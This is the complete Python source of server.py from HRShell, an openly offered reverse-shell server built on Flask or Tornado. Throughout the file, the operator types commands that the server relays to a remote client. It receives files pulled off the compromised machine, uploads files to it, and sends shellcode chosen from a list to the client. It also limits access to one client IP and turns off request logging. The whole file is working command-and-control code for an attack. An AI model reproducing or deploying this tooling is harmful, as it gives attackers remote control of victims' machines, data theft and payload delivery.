#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__Author__      = 'Christophoros Petrou (game0ver)'
__Project_url__ = 'https://github.com/chrispetrou/HRShell'
__License__     = 'GNU General Public License v3.0'
__Version__     = '1.5'

import os
import re
import sys
import ssl
import time
import socket
import logging
from flask import (
    Flask,
    abort,
    request,
    url_for,
    jsonify,
    redirect,
    Blueprint
)
from random import randint
from threading import Thread
from binascii import hexlify
from shellcodes import utils
from importlib import reload
from flask_talisman import Talisman
from flask.logging import default_handler
from base64 import (
    b64decode as bdec,
    urlsafe_b64encode as benc
)
from argparse import (
    SUPPRESS,
    ArgumentParser,
    ArgumentTypeError,
    RawTextHelpFormatter
)
from colorama import (
    init,
    Fore,
    Back,
    Style
)
from tornado.ioloop import IOLoop
from tornado.wsgi import WSGIContainer
from tornado.httpserver import HTTPServer

# CONSOLE-COLORS
B, D, RA = Style.BRIGHT, Style.DIM, Style.RESET_ALL
BL, R, C, Y  = Fore.BLUE, Fore.RED, Fore.CYAN, Fore.YELLOW

c1, c2, waiting = 0, 0, True
progress = {
    0 : ['⚀', '⚁', '⚂', '⚃', '⚄', '⚅'],
    1 : ['|', '/', '-', '\\'],
    2 : ['◥', '◢', '◣', '◤'],
    3 : ['⊢', '⊤', '⊣', '⊥'],
    4 : ['⊔', '⊏', '⊓', '⊐'],
    5 : ['◎', '◉', '●'],
    6 : ['⨁', '⨂'],
    7 : ['❐', '❏']
}

log = logging.getLogger('werkzeug')
log.disabled = True

clientIP = ""
emptyresponse = ('', 204)
upload_contents, cmd_contents = "", ""

exit_cmd        = re.compile(r'^\s*exit\s*')
clear_cmd       = re.compile(r'^\s*clear\s*')
unix_path       = re.compile(r'^\s*download\s*((.+/)*([^/]+))$')
unix_upld       = re.compile(r'^\s*upload\s*(.+/)*([^/]+)$')
wind_path       = re.compile(r'^\s*download\s*((.+\\)*([^/]+))$')
wind_upld       = re.compile(r'^\s*upload\s*(.+\\)*([^/]+)$')
set_shellcode   = re.compile(r'^\s*set\s*shellcode\s*(\d+)\s*$')
show_shellcodes = re.compile(r'^\s*show\s*shellcodes\s*$')

app = Flask(__name__)
app.config['SECRET_KEY'] = hexlify(os.urandom(16)) # you can change that to something permanent...
errors = Blueprint('errors', __name__)

def console():
    parser = ArgumentParser(description="{}server.py:{} An HTTP(S) reverse-shell server with advanced features.".format('\033[1m', '\033[0m'),
                formatter_class=RawTextHelpFormatter)
    parser._optionals.title = "{}arguments{}".format(B, RA)
    parser.add_argument('-s', "--server",
                choices=['flask', 'tornado'],
                default='flask', metavar='',
                help="Specify the HTTP(S) server to use (default: {}flask{}).".format(C, RA))
    parser.add_argument('-c', "--client",
                type=validateIP,
                default=None, metavar='',
                help="Accept connections only from the specified client/IP.")
    parser.add_argument("--host",
                default='0.0.0.0', metavar='',
                help="Specify the IP to use (default: {}0.0.0.0{}).".format(C, RA))
    parser.add_argument('-p', "--port",
                type=validatePort,
                default=5000, metavar='',
                help="Specify a port to use (default: {}5000{}).".format(C, RA))
    parser.add_argument("--http",
                action="store_true",
                help="Disable TLS and use HTTP instead.")
    parser.add_argument("--cert",
                type=ValidateFile,
                metavar='',
                help='Specify a certificate to use (default: {}None{}).'.format(C, RA))
    parser.add_argument("--key",
                type=ValidateFile,
                metavar='',
                help='Specify the corresponding private key to use (default: {}None{}).'.format(C, RA))
    args = parser.parse_args()
    return args

def ret(t):
    sys.stdout.write("\033[F")
    sys.stdout.write("\033[K")
    time.sleep(t)

def custom_print(x):
    ret(.1)
    print(x)

def slowprint(s):
    if not s.endswith('\n'): s += "\n"
    for _ in s:
        sys.stdout.write(_)
        sys.stdout.flush()
        time.sleep(.01)

def rotate(progress):
    global c1, c2
    msg = list('waiting for a connection...')
    msg[c1] = msg[c1].capitalize()
    custom_print('{} '.format(C+progress[c2]+RA) + ''.join(msg))
    c1 += 1
    c2 += 1
    if c1 == len(msg)-3: c1 = 0
    if c2 == len(progress): c2 = 0

def ValidateFile(file):
    if not os.path.isfile(file):
        raise ArgumentTypeError('[x] File does not exist')
    if os.access(file, os.R_OK):
        return file
    else:
        raise ArgumentTypeError('[x] File is not readable')

def validatePort(port):
    if isinstance(int(port), int): # python3
        if 1 < int(port) < 65536:
            return int(port)
        else:
            raise ArgumentTypeError('[x] Port must be in range 1-65535')
    else:
        raise ArgumentTypeError('Port must be in range 1-65535')

def validateIP(ip):
    try:
        if socket.inet_aton(ip):
            return ip
    except socket.error:
        raise ArgumentTypeError('[x] Invalid IP provided')

def craft_prompt(headers, ip):
    try:
        admin_usernames = ['root', 'Administrator', 'SYSTEM']
        username = headers.get('username')
        hostname = headers.get('hostname')
        cur_dir = headers.get('directory')
        if any(uname == username for uname in admin_usernames):
            return f"{B+R+username}-{hostname}@{ip+RA+B}:{BL+B}~{cur_dir+RA}# "
        else:
            return f"{B+R+username}-{hostname}@{ip+RA+B}:{BL+B}~{cur_dir+RA}$ "
    except TypeError:
        print(f"[{B}INFO{RA}] Probably a {B}browser{RA} connected from: {B+ip+RA}")
        abort(403)

@errors.app_errorhandler(Exception)
def handle_unexpected_error(error):
    status_code = 500
    response = {
        'error': {
            'type': 'UnexpectedException',
            'message': 'An unexpected error has occurred.'
        }
    }
    return jsonify(response), status_code

@app.errorhandler(500)
def internal_server_error(e):
    return redirect(url_for('handleGET'))

@app.errorhandler(403)
def error_403(e):
    return ("", 403)

@app.errorhandler(404)
def error_404(e):
    return redirect(url_for('handleGET'))

@app.before_request
def limit_remote_addr():
    if clientIP:
        if request.remote_addr != clientIP:
            abort(403)

def valid_file(file):
    """validate that the file exists and is readable"""
    if not os.path.isfile(file):
        app.logger.error('{} does not exist!'.format(file))
        return False
    if os.access(file, os.R_OK):
        return True
    else:
        app.logger.error('{} is not readable'.format(file))
        return False

@app.route('/')
def handleGET():
    global upload_contents, cmd_contents, waiting
    try:
        if waiting == True:
            waiting = False
            time.sleep(.1)
            ret(.1)
        prompt = craft_prompt(request.headers, request.remote_addr)
        cmd = input(prompt)
        if cmd:
            if unix_path.match(cmd):
                return redirect(url_for('download',
                    filepath=benc(unix_path.search(cmd).group(1).encode()))
                )
            elif unix_upld.match(cmd):
                filepath = cmd.split()[1]
                if valid_file(filepath):
                    file_name = unix_upld.search(cmd).group(2).encode()
                    with open(filepath, 'rb') as f:
                        upload_contents = benc(f.read())
                    return redirect(url_for('upload',
                        filename=file_name)
                    )
                else:
                    abort(404)
            elif wind_path.match(cmd):
                return redirect(url_for('download',
                    filepath=benc(wind_path.search(cmd).group(1).encode()))
                )
            elif wind_upld.match(cmd):
                filepath = cmd.split()[1]
                if valid_file(filepath):
                    file_name = wind_upld.search(cmd).group(2).encode()
                    with open(filepath, 'rb') as f:
                        upload_contents = benc(f.read())
                    return redirect(url_for('upload',
                        filename=file_name)
                    )
                else:
                    abort(404)
            elif clear_cmd.match(cmd):
                os.system('cls') if os.name == 'nt' else os.system('clear')
                return emptyresponse
            elif show_shellcodes.match(cmd):
                reload(utils)
                if utils.shellcodes[1][0]:
                    for k,v in utils.shellcodes.items():
                        print("{} => {}".format(k, v[0]))
                else:
                    print("[x] There are no shellcodes available.")
                return emptyresponse
            elif set_shellcode.match(cmd):
                shc_id = int(set_shellcode.search(cmd).group(1))
                reload(utils)
                try:
                    if utils.shellcodes[shc_id][0]:
                        return redirect(url_for('setshellcode',
                            shc_id=shc_id)
                        )
                    else:
                        print("[x] There is no shellcode with id: {}".format(shc_id))
                        return emptyresponse
                except KeyError:
                    print("[x] There is no shellcode with id: {}".format(shc_id))
                    return emptyresponse
            elif exit_cmd.match(cmd):
                cmd_contents = cmd
                waiting = True
                startloading()
                return redirect(url_for('commander'))
            else:
                cmd_contents = cmd
                return redirect(url_for('commander'))
        else:
            return emptyresponse
    except EOFError:
        abort(404)


@app.route('/', methods=['POST'])
def handlePOST():
    if request.data:
        if request.headers.get('Filename'):
            filename = request.headers.get('Filename')
            if request.headers.get('Action') == 'download':
                with open(filename, 'wb') as w:
                    w.write(bdec(request.data))
                print('{} successfully downloaded!'.format(filename))
            else:
                print('{} successfully uploaded!'.format(filename))
        elif request.headers.get('Shellcode_id'):
            slowprint("[+] Shellcode successfully set to: {}".format(Y+utils.shellcodes[int(request.headers.get('Shellcode_id'))][0])+RA)
        else:
            print(request.data[:-1].decode())
    return emptyresponse


@app.route('/commander/')
def commander():
    return cmd_contents

@app.route('/setshellcode/<int:shc_id>')
def setshellcode(shc_id):
    """
    INFO: Sets shellcode on client-side to a custom shellcode
    <shc_id>: An integer specified by the user that corresponds to
              a custom shellcode from "shellcodes"-dictionary.
    """
    return utils.shellcodes[shc_id][1]

@app.route('/upload/<filename>')
def upload(filename):
    """
    INFO: Handles uploads from server.py --> client.py
    <filename>      : the name & extension of the file uploading in b64 encoding
    upload_contents : file-contents in base64 encoding as part of the page content
    """
    return upload_contents

@app.route('/download/<filepath>')
def download(filepath):
    """
    INFO: Handles downloads from client.py --> server.py
    <filepath>: is the base64 encoded (absolute path of the) file we want to download
    """
    return emptyresponse

@app.before_first_request
def stop_loading():
    global waiting
    waiting = False
    time.sleep(.1)
    ret(.1)

def loading():
    print('')
    prog = progress[randint(0, 7)]
    while waiting==True:
        rotate(prog)

def startloading():
    global c1, c2
    c1, c2 = 0, 0
    t = Thread(target=loading)
    t.daemon = True
    t.start()

if __name__ == '__main__':
    args = console()
    if args.client:
        clientIP = args.client
    if args.server=='flask':
        startloading()
        if args.http:
            app.run(host=args.host, port=args.port, debug=False)
        else:
            Talisman(app)
            if args.cert and args.key:
                app.run(host=args.host, port=args.port, debug=False, ssl_context=(args.cert, args.key))
            else:
                app.run(host=args.host, port=args.port, debug=False, ssl_context='adhoc')
    else:
        if args.http:
            slowprint("* Serving on: {}http://{}:{}{}".format(B+BL, args.host, args.port, RA))
            http_server = HTTPServer(WSGIContainer(app))
        elif args.cert and args.key:
            slowprint("* Serving on: {}https://{}:{}{}".format(B+BL, args.host, args.port, RA))
            Talisman(app)
            ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_ctx.load_cert_chain(args.cert, args.key)
            http_server = HTTPServer(WSGIContainer(app), ssl_options=ssl_ctx)
        else:
            print("{}ERROR:{} Both cert and key must be specified\nor disable TLS with --http option.".format(B, RA))
            sys.exit(0)
        slowprint("* {}Server:{} Tornado-WSGI".format(B, RA))
        startloading()
        try:
            http_server.listen(args.port, address=args.host)
            IOLoop.instance().start()
        except KeyboardInterrupt:
            sys.exit(0)